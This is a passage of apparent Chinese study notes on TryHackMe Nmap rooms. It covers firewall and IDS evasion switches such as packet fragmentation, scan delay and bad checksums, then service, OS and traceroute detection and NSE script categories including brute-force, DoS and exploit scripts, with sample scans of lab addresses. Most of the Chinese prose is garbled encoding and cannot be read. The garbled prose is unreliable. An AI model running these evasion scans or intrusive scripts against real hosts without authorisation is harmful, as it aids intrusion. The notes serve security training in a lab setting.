æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§æ–¹æ³•æ¥ç»•è¿‡è¿™ä¸ªé…ç½®ã€‚å¹¸è¿çš„æ˜¯ï¼ŒNmap ä¸ºæ­¤æä¾›äº†ä¸€ä¸ªé€‰é¡¹ï¼š -Pn ï¼Œå®ƒå‘Šè¯‰ Nmap åœ¨æ‰«æä¸»æœºä¹‹å‰ä¸å¿…è´¹å¿ƒ ping ä¸»æœºã€‚è¿™æ„å‘³ç€ Nmap å°†å§‹ç»ˆå°†ç›®æ ‡ä¸»æœºè§†ä¸ºæ´»åŠ¨çš„ï¼Œä»è€Œæœ‰æ•ˆåœ°ç»•è¿‡ ICMP å—ï¼›ç„¶è€Œï¼Œå®ƒçš„ä»£ä»·æ˜¯å¯èƒ½éœ€è¦å¾ˆé•¿æ—¶é—´æ‰èƒ½å®Œæˆæ‰«æï¼ˆå¦‚æœä¸»æœºç¡®å®æ­»äº†ï¼Œé‚£ä¹ˆ Nmap ä»ç„¶ä¼šæ£€æŸ¥å¹¶ä»”ç»†æ£€æŸ¥æ¯ä¸ªæŒ‡å®šçš„ç«¯å£ï¼‰ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ‚¨å·²ç»ç›´æ¥ä½äºæœ¬åœ°ç½‘ç»œä¸Šï¼ŒNmap è¿˜å¯ä»¥ä½¿ç”¨ ARP è¯·æ±‚æ¥ç¡®å®šä¸»æœºæ´»åŠ¨ã€‚ Nmap è®¤ä¸ºè¿˜æœ‰å¤šç§å…¶ä»–å¼€å…³å¯ç”¨äºè§„é¿é˜²ç«å¢™ã€‚æˆ‘ä»¬ä¸ä¼šè¯¦ç»†ä»‹ç»è¿™äº›å†…å®¹ï¼Œä½†æ˜¯å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°å®ƒä»¬ï¼šhere ä»¥ä¸‹å¼€å…³å°¤å…¶å€¼å¾—æ³¨æ„ï¼š -f ï¼š- ç”¨äºå¯¹æ•°æ®åŒ…è¿›è¡Œåˆ†æ®µï¼ˆå³å°†å®ƒä»¬åˆ†æˆæ›´å°çš„éƒ¨åˆ†ï¼‰ï¼Œä»è€Œé™ä½é˜²ç«å¢™æˆ– IDS æ£€æµ‹åˆ°æ•°æ®åŒ…çš„å¯èƒ½æ€§ã€‚ -f çš„æ›¿ä»£æ–¹æ¡ˆï¼Œä½†æä¾›å¯¹æ•°æ®åŒ…å¤§å°çš„æ›´å¤šæ§åˆ¶ï¼š --mtu &lt;number&gt; ï¼Œæ¥å—ç”¨äºå‘é€çš„æ•°æ®åŒ…çš„æœ€å¤§ä¼ è¾“å•å…ƒå¤§å°ã€‚è¿™å¿…é¡»æ˜¯ 8 çš„å€æ•°ã€‚ --scan-delay &lt;time&gt;ms ï¼š- ç”¨äºåœ¨å‘é€çš„æ•°æ®åŒ…ä¹‹é—´æ·»åŠ å»¶è¿Ÿã€‚å¦‚æœç½‘ç»œä¸ç¨³å®šï¼Œè¿™éå¸¸æœ‰ç”¨ï¼Œè€Œä¸”è¿˜å¯ä»¥é€ƒé¿ä»»ä½•å¯èƒ½å­˜åœ¨çš„åŸºäºæ—¶é—´çš„é˜²ç«å¢™/IDS è§¦å‘å™¨ã€‚ --badsum ï¼š- è¿™ç”¨äºç”Ÿæˆæ•°æ®åŒ…çš„æ— æ•ˆæ ¡éªŒå’Œã€‚ä»»ä½•çœŸæ­£çš„ TCP/IP å †æ ˆéƒ½ä¼šä¸¢å¼ƒæ­¤æ•°æ®åŒ…ï¼Œä½†æ˜¯ï¼Œé˜²ç«å¢™å¯èƒ½ä¼šè‡ªåŠ¨å“åº”ï¼Œè€Œæ— éœ€æ£€æŸ¥æ•°æ®åŒ…çš„æ ¡éªŒå’Œã€‚å› æ­¤ï¼Œè¯¥å¼€å…³å¯ç”¨äºç¡®å®šé˜²ç«å¢™/IDS çš„å­˜åœ¨ã€‚ 0x13 å®è·µ é‡‡ç”¨ç›´æ¥pingç›®æ ‡æœºæˆ–è€…nmap çš„-PEé€‰é¡¹ç¡®å®špingè¯·æ±‚ nmap -sX -p 1-999 -Pn 10.10.162.155 -vv è¿™é‡Œè¯´999ä¸ªç«¯å£éƒ½æ˜¯è¢«è¿‡æ»¤çš„ nmap -sS -p 1-5000 -Pn 10.10.162.155 -vv nmap -Pn --script=ftp-anon -p 21 10.10.162.155 -vv å¯ä»¥çœ‹åˆ°å…è®¸ç™»å½•21ç«¯å£ 0x14 å‚è€ƒæ–‡ç«  Nmap Room Tryhackme Walkthrough 0x15 Nmap åç«¯å£æ‰«æ è¿™é‡Œå°±å½“åšnmapå‘½ä»¤çš„ç¬”è®°å§ æœ¬æˆ¿é—´æ˜¯ Nmap ç³»åˆ—çš„æœ€åä¸€ä¸ªï¼ˆç½‘ç»œå®‰å…¨ç®€ä»‹æ¨¡å—çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚åœ¨è¿™ä¸ªæˆ¿é—´ä¸­ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ç«¯å£æ‰«æä¹‹åçš„æ­¥éª¤ï¼šç‰¹åˆ«æ˜¯æœåŠ¡æ£€æµ‹ã€æ“ä½œç³»ç»Ÿæ£€æµ‹ã€Nmap è„šæœ¬å¼•æ“å’Œä¿å­˜æ‰«æç»“æœã€‚ æœåŠ¡æ£€æµ‹ ä¸€æ—¦ Nmap å‘ç°å¼€æ”¾ç«¯å£ï¼Œæ‚¨å°±å¯ä»¥æ¢æµ‹å¯ç”¨ç«¯å£æ¥æ£€æµ‹æ­£åœ¨è¿è¡Œçš„æœåŠ¡ã€‚å¯¹å¼€æ”¾ç«¯å£çš„è¿›ä¸€æ­¥è°ƒæŸ¥æ˜¯é‡è¦çš„ä¿¡æ¯ï¼Œå› ä¸ºæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥ä½¿ç”¨å®ƒæ¥äº†è§£è¯¥æœåŠ¡æ˜¯å¦å­˜åœ¨ä»»ä½•å·²çŸ¥çš„æ¼æ´ã€‚åŠ å…¥æ¼æ´ 101 äº†è§£æœ‰å…³æœç´¢æ˜“å—æ”»å‡»æœåŠ¡çš„æ›´å¤šä¿¡æ¯ã€‚ å°† -sV æ·»åŠ åˆ° Nmap å‘½ä»¤å°†æ”¶é›†å¹¶ç¡®å®šå¼€æ”¾ç«¯å£çš„æœåŠ¡å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ --version-intensity LEVEL æ§åˆ¶å¼ºåº¦ï¼Œå…¶ä¸­çº§åˆ«èŒƒå›´ä¸º 0ï¼ˆæœ€è½»ï¼‰å’Œ 9ï¼ˆæœ€å®Œæ•´ï¼‰ã€‚ -sV --version-light çš„å¼ºåº¦ä¸º 2ï¼Œè€Œ -sV --version-all çš„å¼ºåº¦ä¸º 9ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ -sV å°†å¼ºåˆ¶ Nmap ç»§ç»­è¿›è¡Œ TCP 3 æ¬¡æ¡æ‰‹å¹¶å»ºç«‹è¿æ¥ã€‚è¿æ¥å»ºç«‹æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºå¦‚æœä¸å®Œå…¨å»ºç«‹è¿æ¥å¹¶ä¸ç›‘å¬æœåŠ¡é€šä¿¡ï¼ŒNmap å°±æ— æ³•å‘ç°ç‰ˆæœ¬ã€‚æ¢å¥è¯è¯´ï¼Œå½“é€‰æ‹© -sV é€‰é¡¹æ—¶ï¼Œç§˜å¯†SYNæ‰«æ -sS æ˜¯ä¸å¯èƒ½çš„ã€‚ ä¸‹é¢çš„æ§åˆ¶å°è¾“å‡ºæ˜¾ç¤ºäº†å¸¦æœ‰ -sV é€‰é¡¹çš„ç®€å• Nmap éšå½¢ SYN æ‰«æã€‚æ·»åŠ  -sV é€‰é¡¹ä¼šå¯¼è‡´è¾“å‡ºä¸­å‡ºç°ä¸€ä¸ªæ–°åˆ—ï¼Œæ˜¾ç¤ºæ¯ä¸ªæ£€æµ‹åˆ°çš„æœåŠ¡çš„ç‰ˆæœ¬ã€‚ä¾‹å¦‚ï¼Œåœ¨ TCP ç«¯å£ 22 æ‰“å¼€çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è·å–çš„ä¸æ˜¯ 22/tcp open ssh ï¼Œè€Œæ˜¯ 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) ã€‚è¯·æ³¨æ„ï¼ŒSSH åè®®è¢«çŒœæµ‹ä¸ºæœåŠ¡ï¼Œå› ä¸º TCP ç«¯å£ 22 å·²æ‰“å¼€ï¼› Nmap ä¸éœ€è¦è¿æ¥åˆ°ç«¯å£ 22 æ¥ç¡®è®¤ã€‚ä½†æ˜¯ï¼Œ -sV éœ€è¦è¿æ¥åˆ°æ­¤å¼€æ”¾ç«¯å£ä»¥è·å–æœåŠ¡æ¨ªå¹…åŠå…¶å¯ä»¥è·å¾—çš„ä»»ä½•ç‰ˆæœ¬ä¿¡æ¯ï¼Œä¾‹å¦‚ nginx 1.6.2 ã€‚å› æ­¤ï¼Œä¸æœåŠ¡åˆ—ä¸åŒï¼Œç‰ˆæœ¬åˆ—ä¸æ˜¯çŒœæµ‹ã€‚ è¯·æ³¨æ„ï¼Œè®¸å¤š Nmap é€‰é¡¹éœ€è¦ root æƒé™ã€‚é™¤éæ‚¨ä»¥ root èº«ä»½è¿è¡Œ Nmapï¼Œå¦åˆ™æ‚¨éœ€è¦ä½¿ç”¨ sudo ã€‚ æ“ä½œç³»ç»Ÿæ£€æµ‹å’ŒTraceroute æ“ä½œç³»ç»Ÿæ£€æµ‹ Nmap å¯ä»¥æ ¹æ®æ“ä½œç³»ç»Ÿ (OS) çš„è¡Œä¸ºåŠå…¶å“åº”ä¸­çš„ä»»ä½•è¿¹è±¡æ¥æ£€æµ‹æ“ä½œç³»ç»Ÿ (OS)ã€‚å¯ä»¥ä½¿ç”¨ -O å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼›è¿™æ˜¯ OS ä¸­çš„å¤§å†™ Oã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åœ¨ AttackBox ä¸Šè¿è¡Œ nmap -sS -O 10.10.212.228 ã€‚ Nmapæ£€æµ‹åˆ°æ“ä½œç³»ç»Ÿæ˜¯Linux 3.Xï¼Œç„¶åè¿›ä¸€æ­¥çŒœæµ‹å®ƒè¿è¡Œçš„æ˜¯å†…æ ¸3.13ã€‚ pentester@TryHackMe$ sudo nmap -sS -O 10.10.212.228 Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:04 BST Nmap scan report for 10.10.212.228 Host is up (0.00099s latency). Not shown: 994 closed ports PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 111/tcp open rpcbind 143/tcp open imap MAC Address: 02:A0:E7:B5:B6:C5 (Unknown) Device type: general purpose Running: Linux 3.X OS CPE: cpe:/o:linux:linux_kernel:3.13 OS details: Linux 3.13 Network Distance: 1 hop OS detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 3.91 seconds æˆ‘ä»¬æ‰«æå¹¶å°è¯•æ£€æµ‹å…¶æ“ä½œç³»ç»Ÿç‰ˆæœ¬çš„ç³»ç»Ÿæ­£åœ¨è¿è¡Œå†…æ ¸ç‰ˆæœ¬ 3.16ã€‚ Nmap èƒ½å¤Ÿåœ¨è¿™ç§æƒ…å†µä¸‹åšå‡ºæ¥è¿‘çš„çŒœæµ‹ã€‚åœ¨å¦ä¸€ä¸ªæ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬æ‰«æäº†å†…æ ¸ä¸º5.13.14çš„Fedora Linuxç³»ç»Ÿï¼›ç„¶è€Œï¼ŒNmap æ£€æµ‹åˆ°å®ƒæ˜¯ Linux 2.6.Xã€‚å¥½æ¶ˆæ¯æ˜¯ Nmap æ­£ç¡®æ£€æµ‹åˆ°æ“ä½œç³»ç»Ÿï¼›ä¸å¤ªå¥½çš„æ¶ˆæ¯æ˜¯å†…æ ¸ç‰ˆæœ¬é”™è¯¯ã€‚ æ“ä½œç³»ç»Ÿæ£€æµ‹éå¸¸æ–¹ä¾¿ï¼Œä½†è®¸å¤šå› ç´ å¯èƒ½ä¼šå½±å“å…¶å‡†ç¡®æ€§ã€‚é¦–å…ˆï¼ŒNmapéœ€è¦åœ¨ç›®æ ‡ä¸Šæ‰¾åˆ°è‡³å°‘ä¸€ä¸ªå¼€æ”¾ç«¯å£å’Œä¸€ä¸ªå…³é—­ç«¯å£æ‰èƒ½è¿›è¡Œå¯é çš„çŒœæµ‹ã€‚æ­¤å¤–ï¼Œç”±äºè™šæ‹ŸåŒ–å’Œç±»ä¼¼æŠ€æœ¯çš„å¹¿æ³›ä½¿ç”¨ï¼Œå®¢æˆ·æ“ä½œç³»ç»Ÿçš„æŒ‡çº¹å¯èƒ½ä¼šå˜å¾—æ‰­æ›²ã€‚å› æ­¤ï¼Œåœ¨ä½¿ç”¨æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯æ—¶ï¼Œè¦æŒæœ‰æ€€ç–‘æ€åº¦ã€‚ è·¯ç”±è¿½è¸ª å¦‚æœä½ æƒ³è®© Nmap æ‰¾åˆ°ä½ å’Œç›®æ ‡ä¹‹é—´çš„è·¯ç”±å™¨ï¼Œåªéœ€æ·»åŠ  --traceroute ã€‚åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼ŒNmap å°†è·Ÿè¸ªè·¯ç”±é™„åŠ åˆ°å…¶æ‰«æç»“æœä¸­ã€‚è¯·æ³¨æ„ï¼ŒNmap çš„è·Ÿè¸ªè·¯ç”±çš„å·¥ä½œæ–¹å¼ä¸ Linux å’Œ macOS ä¸Šçš„ traceroute å‘½ä»¤æˆ– MS Windows ä¸Šçš„ tracert å‘½ä»¤ç•¥æœ‰ä¸åŒã€‚æ ‡å‡† traceroute ä»¥ä½ TTLï¼ˆç”Ÿå­˜æ—¶é—´ï¼‰æ•°æ®åŒ…å¼€å§‹ï¼Œå¹¶ä¸æ–­å¢åŠ ç›´è‡³åˆ°è¾¾ç›®æ ‡ã€‚ Nmap çš„è·Ÿè¸ªè·¯ç”±ä»é«˜ TTL çš„æ•°æ®åŒ…å¼€å§‹ï¼Œå¹¶ä¸æ–­å‡å°‘å®ƒã€‚ åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åœ¨ AttackBox ä¸Šæ‰§è¡Œäº† nmap -sS --traceroute 10.10.212.228 ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤è€…ä¹‹é—´æ²¡æœ‰è·¯ç”±å™¨/è·ƒç‚¹ï¼Œå› ä¸ºå®ƒä»¬æ˜¯ç›´æ¥è¿æ¥çš„ã€‚ pentester@TryHackMe$ sudo nmap -sS --traceroute 10.10.212.228 Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:05 BST Nmap scan report for 10.10.212.228 Host is up (0.0015s latency). Not shown: 994 closed ports PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 111/tcp open rpcbind 143/tcp open imap MAC Address: 02:A0:E7:B5:B6:C5 (Unknown) TRACEROUTE HOP RTT ADDRESS 1 1.48 ms MACHINE_IP Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè®¸å¤šè·¯ç”±å™¨éƒ½é…ç½®ä¸ºä¸å‘é€è¶…å‡ºç”Ÿå­˜æ—¶é—´çš„ ICMPï¼Œè¿™ä¼šé˜»æ­¢æˆ‘ä»¬å‘ç°å®ƒä»¬çš„ IP åœ°å€ã€‚æ¬²äº†è§£æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®ä¸»åŠ¨ä¾¦å¯Ÿå®¤ã€‚ nmap -sS -O 10.10.212.228 Nmap è„šæœ¬ NSE è„šæœ¬æ˜¯ä¸€æ®µä¸éœ€è¦ç¼–è¯‘çš„ä»£ç ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒä¿æŒåŸæ¥çš„äººç±»å¯è¯»å½¢å¼ï¼Œä¸éœ€è¦è½¬æ¢ä¸ºæœºå™¨è¯­è¨€ã€‚è®¸å¤šç¨‹åºé€šè¿‡è„šæœ¬æä¾›é™„åŠ åŠŸèƒ½ï¼›æ­¤å¤–ï¼Œè„šæœ¬å¯ä»¥æ·»åŠ é€šè¿‡å†…ç½®å‘½ä»¤ä¸å­˜åœ¨çš„è‡ªå®šä¹‰åŠŸèƒ½ã€‚åŒæ ·ï¼ŒNmap ä¹Ÿæä¾›å¯¹ä½¿ç”¨ Lua è¯­è¨€çš„è„šæœ¬çš„æ”¯æŒã€‚ Nmap è„šæœ¬å¼•æ“ï¼ˆNSEï¼‰æ˜¯ Nmap çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯ä¸€ä¸ª Lua è§£é‡Šå™¨ï¼Œå…è®¸ Nmap æ‰§è¡Œç”¨ Lua è¯­è¨€ç¼–å†™çš„ Nmap è„šæœ¬ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ä¸éœ€è¦å­¦ä¹  Lua æ¥ä½¿ç”¨ Nmap è„šæœ¬ã€‚ æ‚¨çš„ Nmap é»˜è®¤å®‰è£…å¯ä»¥è½»æ¾åŒ…å«è¿‘ 600 ä¸ªè„šæœ¬ã€‚æŸ¥çœ‹ Nmap å®‰è£…æ–‡ä»¶å¤¹ã€‚åœ¨ AttackBox ä¸Šï¼Œæ£€æŸ¥ /usr/share/nmap/scripts å¤„çš„æ–‡ä»¶ï¼Œæ‚¨ä¼šæ³¨æ„åˆ°æœ‰æ•°ç™¾ä¸ªè„šæœ¬ï¼Œä»¥å®ƒä»¬çš„ç›®æ ‡åè®®å¼€å¤´ï¼Œæ–¹ä¾¿å‘½åã€‚æˆ‘ä»¬åœ¨ä¸‹é¢çš„æ§åˆ¶å°è¾“å‡ºä¸­åˆ—å‡ºäº† AttackBox ä¸Šä»¥ HTTP å¼€å¤´çš„æ‰€æœ‰è„šæœ¬ï¼›æˆ‘ä»¬å‘ç°äº†å¤§çº¦ 130 ä¸ªä»¥ http å¼€å¤´çš„è„šæœ¬ã€‚éšç€æœªæ¥çš„æ›´æ–°ï¼Œæ‚¨åªèƒ½æœŸæœ›å®‰è£…çš„è„šæœ¬æ•°é‡ä¼šå¢åŠ ã€‚ æ‚¨å¯ä»¥æŒ‡å®šä½¿ç”¨è¿™äº›å·²å®‰è£…è„šæœ¬ä¸­çš„ä»»ä½•ä¸€ä¸ªæˆ–ä¸€ç»„ï¼›æ­¤å¤–ï¼Œæ‚¨å¯ä»¥å®‰è£…å…¶ä»–ç”¨æˆ·çš„è„šæœ¬å¹¶å°†å…¶ç”¨äºæ‰«æã€‚è®©æˆ‘ä»¬ä»é»˜è®¤è„šæœ¬å¼€å§‹ã€‚æ‚¨å¯ä»¥é€‰æ‹©ä½¿ç”¨ --script=default æˆ–ç®€å•åœ°æ·»åŠ  -sC æ¥è¿è¡Œé»˜è®¤ç±»åˆ«ä¸­çš„è„šæœ¬ã€‚é™¤äº†é»˜è®¤ä¹‹å¤–ï¼Œç±»åˆ«è¿˜åŒ…æ‹¬èº«ä»½éªŒè¯ã€å¹¿æ’­ã€æš´åŠ›ã€é»˜è®¤ã€å‘ç°ã€dosã€æ¼æ´åˆ©ç”¨ã€å¤–éƒ¨ã€æ¨¡ç³Šå™¨ã€ä¾µå…¥ã€æ¶æ„è½¯ä»¶ã€å®‰å…¨ã€ç‰ˆæœ¬å’Œæ¼æ´ã€‚ç®€è¦è¯´æ˜å¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚ Script Category Description auth è®¤è¯ç›¸å…³è„šæœ¬ broadcast é€šè¿‡å‘é€å¹¿æ’­æ¶ˆæ¯å‘ç°ä¸»æœº brute å¯¹ç™»å½•æ‰§è¡Œæš´åŠ›å¯†ç å®¡æ ¸ default é»˜è®¤è„šæœ¬ï¼Œä¸ -sC ç›¸åŒ discovery æ£€ç´¢å¯è®¿é—®çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ•°æ®åº“è¡¨å’Œ DNS åç§° dos æ£€æµ‹æ˜“å—æ‹’ç»æœåŠ¡ (DoS) æ”»å‡»çš„æœåŠ¡å™¨ exploit å°è¯•åˆ©ç”¨å„ç§æ˜“å—æ”»å‡»çš„æœåŠ¡ external ä½¿ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡è¿›è¡Œæ£€æŸ¥ï¼Œä¾‹å¦‚ Geoplugin å’Œ Virustotal fuzzer å‘èµ·æ¨¡ç³Šæ”»å‡» intrusive æš´åŠ›æ”»å‡»å’Œåˆ©ç”¨ç­‰ä¾µå…¥æ€§è„šæœ¬ malware æ‰«æåé—¨ safe ä¸ä¼šä½¿ç›®æ ‡å´©æºƒçš„å®‰å…¨è„šæœ¬ version æ£€ç´¢æœåŠ¡ç‰ˆæœ¬ vuln æ£€æŸ¥æ¼æ´æˆ–åˆ©ç”¨æ˜“å—æ”»å‡»çš„æœåŠ¡ æœ‰äº›è„šæœ¬å±äºå¤šä¸ªç±»åˆ«ã€‚æ­¤å¤–ï¼Œä¸€äº›è„šæœ¬å¯¹æœåŠ¡å‘èµ·æš´åŠ›æ”»å‡»ï¼Œè€Œå¦ä¸€äº›è„šæœ¬åˆ™å‘èµ· DoS æ”»å‡»å¹¶åˆ©ç”¨ç³»ç»Ÿã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨ä¸æƒ³ä½¿æœåŠ¡å´©æºƒæˆ–åˆ©ç”¨å®ƒä»¬ï¼Œé‚£ä¹ˆåœ¨é€‰æ‹©è¦è¿è¡Œçš„è„šæœ¬æ—¶è¦å°å¿ƒï¼Œè¿™ä¸€ç‚¹è‡³å…³é‡è¦ã€‚ æˆ‘ä»¬ä½¿ç”¨ Nmap å¯¹ 10.10.104.195 è¿è¡Œ SYN æ‰«æï¼Œå¹¶åœ¨æ§åˆ¶å°ä¸­æ‰§è¡Œé»˜è®¤è„šæœ¬ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚è¯¥å‘½ä»¤æ˜¯ sudo nmap -sS -sC 10.10.104.195 ï¼Œå…¶ä¸­ -sC å°†ç¡®ä¿ Nmap åœ¨ SYN æ‰«æä¹‹åæ‰§è¡Œé»˜è®¤è„šæœ¬ã€‚ä¸‹é¢å‡ºç°äº†æ–°çš„è¯¦ç»†ä¿¡æ¯ã€‚æŸ¥çœ‹22ç«¯å£çš„SSHæœåŠ¡ï¼› Nmap æ¢å¤äº†ä¸æ­£åœ¨è¿è¡Œçš„æœåŠ¡å™¨ç›¸å…³çš„æ‰€æœ‰å››ä¸ªå…¬é’¥ã€‚è€ƒè™‘å¦ä¸€ä¸ªä¾‹å­ï¼Œç«¯å£ 80 ä¸Šçš„ HTTP æœåŠ¡ï¼› Nmap æ£€ç´¢é»˜è®¤é¡µé¢æ ‡é¢˜ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥é¡µé¢å·²ä¿ç•™ä¸ºé»˜è®¤é¡µé¢ã€‚ pentester@TryHackMe$ sudo nmap -sS -sC 10.10.104.195 Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:08 BST Nmap scan report for ip-10-10-161-170.eu-west-1.compute.internal (10.10.161.170) Host is up (0.0011s latency). Not shown: 994 closed ports PORT STATE SERVICE 22/tcp open ssh | ssh-hostkey: | 1024 d5:80:97:a3:a8:3b:57:78:2f:0a:78:ae:ad:34:24:f4 (DSA) | 2048 aa:66:7a:45:eb:d1:8c:00:e3:12:31:d8:76:8e:ed:3a (RSA) | 256 3d:82:72:a3:07:49:2e:cb:d9:87:db:08:c6:90:56:65 (ECDSA) |_ 256 dc:f0:0c:89:70:87:65:ba:52:b1:e9:59:f7:5d:d2:6a (EdDSA) 25/tcp open smtp |_smtp-commands: debra2.thm.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, | ssl-cert: Subject: commonName=debra2.thm.local | Not valid before: 2021-08-10T12:10:58 |_Not valid after: 2031-08-08T12:10:58 |_ssl-date: TLS randomness does not represent time 80/tcp open http |_http-title: Welcome to nginx on Debian! 110/tcp open pop3 |_pop3-capabilities: RESP-CODES CAPA TOP SASL UIDL PIPELINING AUTH-RESP-CODE 111/tcp open rpcbind | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100024 1 38099/tcp status |_ 100024 1 54067/udp status 143/tcp open imap |_imap-capabilities: LITERAL+ capabilities IMAP4rev1 OK Pre-login ENABLE have LOGINDISABLEDA0001 listed SASL-IR ID more post-login LOGIN-REFERRALS IDLE MAC Address: 02:A0:E7:B5:B6:C5 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ --script \"SCRIPT-NAME\" æˆ– --script \"ftp*\" ç­‰æ¨¡å¼æŒ‰åç§°æŒ‡å®šè„šæœ¬ï¼Œå…¶ä¸­åŒ…æ‹¬ ftp-brute ã€‚å¦‚æœæ‚¨ä¸ç¡®å®šè„šæœ¬çš„ä½œç”¨ï¼Œå¯ä»¥ä½¿ç”¨æ–‡æœ¬é˜…è¯»å™¨ï¼ˆä¾‹å¦‚ less ï¼‰æˆ–æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€è„šæœ¬æ–‡ä»¶ã€‚å¯¹äº ftp-brute ï¼Œå®ƒæŒ‡å‡ºï¼šâ€œå¯¹ FTP æœåŠ¡å™¨æ‰§è¡Œæš´åŠ›å¯†ç å®¡æ ¸ã€‚â€æ‚¨å¿…é¡»å°å¿ƒï¼Œå› ä¸ºæŸäº›è„šæœ¬éå¸¸å…·æœ‰ä¾µå…¥æ€§ã€‚æ­¤å¤–ï¼ŒæŸäº›è„šæœ¬å¯èƒ½é€‚ç”¨äºç‰¹å®šæœåŠ¡å™¨ï¼Œå¦‚æœéšæœºé€‰æ‹©ï¼Œåˆ™ä¼šæµªè´¹æ‚¨çš„æ—¶é—´è€Œæ²¡æœ‰ä»»ä½•å¥½å¤„ã€‚ä¸å¾€å¸¸ä¸€æ ·ï¼Œè¯·ç¡®ä¿æ‚¨æœ‰æƒåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šå¯åŠ¨æ­¤ç±»æµ‹è¯•ã€‚ è®©æˆ‘ä»¬è€ƒè™‘ä¸€ä¸ªè‰¯æ€§è„šæœ¬ http-date ï¼Œæˆ‘ä»¬çŒœæµ‹å®ƒä¼šæ£€ç´¢ http æœåŠ¡å™¨æ—¥æœŸå’Œæ—¶é—´ï¼Œè¿™åœ¨å…¶æè¿°ä¸­ç¡®å®å¾—åˆ°äº†è¯å®ï¼šâ€œä»ç±»ä¼¼ HTTP çš„æœåŠ¡è·å–æ—¥æœŸã€‚æ­¤å¤–ï¼Œå®ƒè¿˜ä¼šæ‰“å°æ—¥æœŸä¸å½“åœ°æ—¶é—´çš„å·®å¼‚â€¦â€¦â€åœ¨ AttackBox ä¸Šï¼Œæˆ‘ä»¬æ‰§è¡Œ sudo nmap -sS -n --script \"http-date\" 10.10.104.195 ï¼Œå¦‚ä¸‹é¢çš„æ§åˆ¶å°æ‰€ç¤ºã€‚ pentester@TryHackMe$ sudo nmap -sS -n --script \"http-date\" 10.10.104.195 Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 08:04 BST Nmap scan report for 10.10.104.195 Host is up (0.0011s latency). Not shown: 994 closed ports PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http |_http-date: Fri, 10 Sep 2021 07:04:26 GMT; 0s from local time. 110/tcp open pop3 111/tcp open rpcbind 143/tcp open imap MAC Address: 02:44:87:82:AC:83 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds æœ€åï¼Œæ‚¨å¯ä»¥å°† Nmap çš„åŠŸèƒ½æ‰©å±•åˆ°å®˜æ–¹ Nmap è„šæœ¬ä¹‹å¤–ï¼›æ‚¨å¯ä»¥ç¼–å†™è„šæœ¬æˆ–ä» Internet ä¸‹è½½ Nmap è„šæœ¬ã€‚ä» Internet ä¸‹è½½å’Œä½¿ç”¨ Nmap è„šæœ¬å­˜åœ¨ä¸€å®šç¨‹åº¦çš„é£é™©ã€‚å› æ­¤ï¼Œæœ€å¥½ä¸è¦è¿è¡Œæ‚¨ä¸ä¿¡ä»»çš„ä½œè€…çš„è„šæœ¬ã€‚ çŸ¥é“ Nmap è„šæœ¬ä¿å­˜åœ¨ AttackBox ä¸Šçš„ /usr/share/nmap/scripts ä¸­ã€‚è„šæœ¬ http-robots.txt æ£€æŸ¥ä»€ä¹ˆï¼Ÿ å¦‚æœå°šæœªå¯åŠ¨ AttackBoxï¼Œè¯·å¯åŠ¨å®ƒã€‚ç¡®ä¿å·²ä»ä»»åŠ¡ 2 ç»ˆæ­¢ VM åï¼Œå¯åŠ¨æ­¤ä»»åŠ¡çš„ç›®æ ‡è®¡ç®—æœºã€‚åœ¨ AttackBox ä¸Šï¼Œä½¿ç”¨é»˜è®¤è„šæœ¬ -sC é’ˆå¯¹ 10.10.104.195 è¿è¡Œ Nmapã€‚æ‚¨ä¼šæ³¨æ„åˆ°æœ‰ä¸€ä¸ªæœåŠ¡æ­£åœ¨ä¾¦å¬ç«¯å£ 53ã€‚å®ƒçš„å®Œæ•´ç‰ˆæœ¬å€¼æ˜¯å¤šå°‘ï¼Ÿ 